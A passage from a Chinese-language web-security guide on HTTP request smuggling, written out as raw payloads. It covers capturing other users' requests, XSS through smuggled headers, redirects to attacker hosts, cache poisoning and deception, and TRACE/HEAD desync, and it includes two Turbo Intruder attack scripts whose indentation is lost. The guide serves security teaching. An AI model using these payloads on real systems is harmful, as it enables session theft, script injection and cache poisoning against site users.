
重要的是要将嵌套请求的 `Content-Length` 头与实际内容长度对齐。建议从一个小值开始并逐渐增加，因为过低的值会截断反射的数据，而过高的值可能会导致请求出错。

这种技术在 TE.CL 漏洞的上下文中也适用，但请求应以 `search=\r\n0` 结束。无论换行符如何，值将附加到搜索参数中。

此方法主要用于理解前端代理所做的请求修改，基本上进行自我导向的调查。

## 5.3 捕获其他用户的请求

通过在 POST 操作期间将特定请求附加为参数的值，可以捕获下一个用户的请求。以下是如何实现这一点的：

通过将以下请求附加为参数的值，您可以存储后续客户端的请求：
```http
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
在这种情况下，**comment 参数**旨在存储公开可访问页面上帖子评论部分的内容。因此，后续请求的内容将作为评论出现。

然而，这种技术有其局限性。通常，它仅捕获 smuggled 请求中使用的参数分隔符之前的数据。对于 URL 编码的表单提交，这个分隔符是 `&` 字符。这意味着从受害者用户请求中捕获的内容将在第一个 `&` 处停止，这可能甚至是查询字符串的一部分。

此外，值得注意的是，这种方法在 TE.CL 漏洞中也是可行的。在这种情况下，请求应以 `search=\r\n0` 结束。无论换行符如何，值将附加到搜索参数。

## 5.4 使用 HTTP 请求走私来利用反射型 XSS

HTTP 请求走私可以被用来利用易受 **反射型 XSS** 攻击的网页，提供显著的优势：

- **不需要**与目标用户互动。
- 允许在 **通常无法达到** 的请求部分利用 XSS，例如 HTTP 请求头。

在网站通过 User-Agent 头部易受反射型 XSS 攻击的情况下，以下有效载荷演示了如何利用此漏洞：
```http
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
这个有效载荷的结构旨在利用漏洞，通过以下方式：

1. 发起一个看似典型的 `POST` 请求，带有 `Transfer-Encoding: chunked` 头部以指示开始走私。
2. 随后跟随一个 `0`，标记块消息体的结束。
3. 然后，引入一个走私的 `GET` 请求，其中 `User-Agent` 头部注入了一个脚本，`<script>alert(1)</script>`，当服务器处理这个后续请求时触发 XSS。

通过走私操控 `User-Agent`，该有效载荷绕过了正常请求约束，从而以非标准但有效的方式利用了反射型 XSS 漏洞。

#### HTTP/0.9

> [!CAUTION]
> 如果用户内容在响应中以 **`Content-type`** 反射，例如 **`text/plain`**，将阻止 XSS 的执行。如果服务器支持 **HTTP/0.9，可能可以绕过这一点**！

版本 HTTP/0.9 是在 1.0 之前，仅使用 **GET** 动词，并且 **不响应头部**，只有主体。

在 [**这篇文章**](https://mizu.re/post/twisty-python) 中，这被滥用通过请求走私和一个 **会回复用户输入的易受攻击端点** 来走私一个 HTTP/0.9 请求。响应中反射的参数包含一个 **伪造的 HTTP/1.1 响应（带有头部和主体）**，因此响应将包含有效的可执行 JS 代码，`Content-Type` 为 `text/html`。

## 5.5 利用 HTTP 请求走私进行站内重定向

应用程序通常通过使用重定向 URL 中的 `Host` 头部的主机名从一个 URL 重定向到另一个 URL。这在像 Apache 和 IIS 这样的 web 服务器中很常见。例如，请求一个没有尾部斜杠的文件夹会导致重定向以包含斜杠：
```http
GET /home HTTP/1.1
Host: normal-website.com
```
结果为：
```http
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
尽管看似无害，但这种行为可以通过 HTTP request smuggling 被操控，以将用户重定向到外部网站。例如：
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
这个被走私的请求可能导致下一个处理的用户请求被重定向到攻击者控制的网站：
```http
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
结果为：
```http
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
在这个场景中，用户对 JavaScript 文件的请求被劫持。攻击者可以通过响应恶意 JavaScript 来潜在地危害用户。

## 5.6 通过 HTTP 请求走私利用 Web 缓存中毒

如果 **前端基础设施的任何组件缓存内容**，通常是为了提高性能，则可以执行 Web 缓存中毒。通过操纵服务器的响应，可以 **毒化缓存**。

之前，我们了解到如何改变服务器响应以返回 404 错误（参见 [基本示例](#基本示例)）。同样，我们也可以改变 `/static/include.js` 的响应以返回 `/index.html` 的内容。因此，`/static/include.js` 的内容在缓存中被替换为 `/index.html` 的内容，使得 `/static/include.js` 对用户不可访问，可能导致服务拒绝（DoS）。

如果发现 **开放重定向漏洞** 或者存在 **站内重定向到开放重定向**，这种技术变得特别强大。这些漏洞可以被利用来将 `/static/include.js` 的缓存内容替换为攻击者控制的脚本，从而实质上使所有请求更新的 `/static/include.js` 的客户端面临广泛的跨站脚本（XSS）攻击。

下面是利用 **缓存中毒结合站内重定向到开放重定向** 的示例。目标是改变 `/static/include.js` 的缓存内容，以提供由攻击者控制的 JavaScript 代码：
```http
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
注意嵌入的请求针对 `/post/next?postId=3`。该请求将被重定向到 `/post?postId=4`，利用 **Host header value** 来确定域名。通过更改 **Host header**，攻击者可以将请求重定向到他们的域名 (**on-site redirect to open redirect**)。

在成功的 **socket poisoning** 之后，应发起对 `/static/include.js` 的 **GET request**。该请求将受到先前 **on-site redirect to open redirect** 请求的污染，并获取由攻击者控制的脚本内容。

随后，任何对 `/static/include.js` 的请求将提供攻击者脚本的缓存内容，有效地发起广泛的 XSS 攻击。

## 5.7 使用 HTTP request smuggling 执行 web cache deception

> **web cache poisoning 和 web cache deception 之间有什么区别？**
>
> - 在 **web cache poisoning** 中，攻击者使应用程序在缓存中存储一些恶意内容，并且这些内容从缓存中提供给其他应用程序用户。
> - 在 **web cache deception** 中，攻击者使应用程序在缓存中存储属于另一个用户的一些敏感内容，然后攻击者从缓存中检索这些内容。

攻击者构造一个偷渡请求，以获取敏感的用户特定内容。考虑以下示例：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Length: 43
Transfer-Encoding: chunked

0

GET /private/messages HTTP/1.1
Foo: X
```

如果这个走私请求污染了用于静态内容的缓存条目（例如，`/someimage.png`），那么受害者在`/private/messages`中的敏感数据可能会被缓存到静态内容的缓存条目下。因此，攻击者可能会检索到这些缓存的敏感数据。

## 5.8 通过 HTTP 请求走私滥用 TRACE

[**在这篇文章中**](https://portswigger.net/research/trace-desync-attack) 建议如果服务器启用了 TRACE 方法，可能会通过 HTTP 请求走私进行滥用。这是因为该方法会将发送到服务器的任何头部反射为响应体的一部分。例如：
- `TRACE` 请求
```http
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
- `TRACE` 响应
```http
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
一个滥用这种行为的例子是**首先伪装一个HEAD请求**。该请求将仅以GET请求的**头部**进行响应（其中包括 **`Content-Type`**）。然后立即伪装**一个TRACE请求**，该请求将**反射发送的数据**。\
由于HEAD响应将包含一个`Content-Length`头，**TRACE请求的响应将被视为HEAD响应的主体，因此在响应中反射任意数据**。\
该响应将被发送到连接上的下一个请求，因此这可以**用于缓存的JS文件，例如注入任意JS代码**。

- 请求示例
```http
GET / HTTP/1.1
Host: vulnerable.com
Content-Length: 150

HEAD / HTTP/1.1
Host: vulnerable.com

TRACE / HTTP/1.1
Host: vulnerable.com
SomeHeader: <script>alert("reflected")</script>
Other: aaaaaa…
```

- 响应示例
```http
HTTP/1.1 200 OK                                   👈 GET 请求响应
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK                                   👈 HEAD 请求响应，但在代理是视角中没有看见过 HEAD 请求，所以认为这个是下一个请求的响应
Content-Type: message/http
Content-Length: 110                               👈 HEAD 请求响应 CL 头

TRACE / HTTP/1.1                                  👈 TRACE 请求响应，将会被代理当作下一个请求的响应体
Host: vulnerable.com
SomeHeader: <script>alert("reflected")</script>
Other: aaaaaa….
```

## 5.9 通过 HTTP 响应拆分滥用 TRACE

继续关注[**这篇文章**](https://portswigger.net/research/trace-desync-attack)，作者设想了一种情况：攻击者可以拆分一个响应，从而创建一个任意构造的 HTTP 响应消息，并将其存储在缓存中。

要实现这一点，前提是应用允许某种包含换行符的内容反射，这样攻击者就可以同时控制响应头和响应体，以下是作者提供的示例：

- 请求示例
```http
GET / HTTP/1.1
Host: vulnerable.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: vulnerable.com

POST /reflect HTTP/1.1
Host: vulnerable.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert(“arbitrary response”)</script>
```

- 响应示例
```http
HTTP/1.1 200 OK                       👈 GET 响应
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK                       👈 HEAD 响应
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK                       👈 POST 响应
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```

代理没有见过 `HEAD` 请求，将 `HEAD` 响应视为下一个请求的响应体，且根据 `HEAD` 响应的 `CL` 指示截断了 POST 响应的部分数据，剩余部分刚好构成一个完整的 HTTP 响应，成为下下个请求的响应。

但是应用允许某种包含换行符的内容反射的情况极其罕见，作者巧妙将上面的技巧结合 `TRACE` 方法提出了新的攻击方案：

- 请求示例：
```http
GET / HTTP/1.1
Host: vulnerable.com
Content-Length: 268

HEAD /smuggled HTTP/1.1
Host: vulnerable.com

TRACE / HTTP/1.1
Host: vulnerable.com
A: HTTP/1.1 200 Ok
Cache-Control: max-age=1000000
B: 

HEAD /smuggled HTTP/1.1
Host: vulnerable.com

TRACE / HTTP/1.1
Host: vulnerable.com
A: <script>alert("XSS")</script>
```

- 响应示例：
```http
HTTP/1.1 200 OK                                             👈 GET 响应
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 Ok                                             👈 HEAD 响应
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 Ok                                             👈 TRACE 响应
Content-Type: message/http
Content-Length: 150

TRACE / HTTP/1.1
Host: vulnerable.com
Padding: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
A: HTTP/1.1 200 OK
Cache-Control: max-age=1000000
B: HTTP/1.1 200 OK                                          👈 HEAD 响应
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 Ok                                             👈 TRACE 响应
Content-Type: message/http
Content-Length: 79

TRACE / HTTP/1.1                                            
Host: vulnerable.com
A: <script>alert("Arbitrary XSS")</script>
```

响应在代理中的处理逻辑如下过程：
1. `HEAD` 响应被视为下一个请求的响应，代理根据 `CL` 指示读取后端返回响应数据。
2. 代理刚好读取到 `A: `，剩余的数据刚好构成一个的完整的响应数据，被视为是下下请求的响应行。
3. 通过 `B: ` 吃了第二个 `HEAD` 响应的响应行 `HTTP/1.1 200 OK` 避免代理在处理伪造的响应的时候发生错误。
4. 代理根据第二个 `HEAD` 响应的 `CL` 指示读取后端返回响应数据，将 `TRACE` 响应数据包括 `<script>alert("Arbitrary XSS")</script>` 视为下下个请求的响应数据体。
5. 由于 `Cache-Control: max-age=1000000` 的存在，缓存服务器根据指示将攻击者构造的恶意响应与下下个请求进行关联映射。假设下下个请求是 `/js/BaseConfig.js` 静态资源请求，则关于任何用户对该资源的请求都会返回攻击者设定的恶意响应。

[关于文章：https://portswigger.net/research/trace-desync-attack 的解读](./请求走私利用.xmind)

# 0x06 其他 TIPS

## 6.1 武器化 HTTP 请求走私与 HTTP 响应不同步

您是否发现了一些 HTTP 请求走私漏洞，但不知道如何利用它？尝试这些其他的利用方法：

../http-response-smuggling-desync.md

## 6.2 其他 HTTP 请求走私技术

- 浏览器 HTTP 请求走私(客户端)

browser-http-request-smuggling.md

- HTTP/2 降级中的请求走私

request-smuggling-in-http-2-downgrades.md

## 6.3 Turbo intruder 脚本

### CL.TE

来自 [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

来自: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
# 0X07 工具

- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): 该工具是一个基于语法的HTTP Fuzzer，有助于发现奇怪的请求走私差异。

# 0X08 参考

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
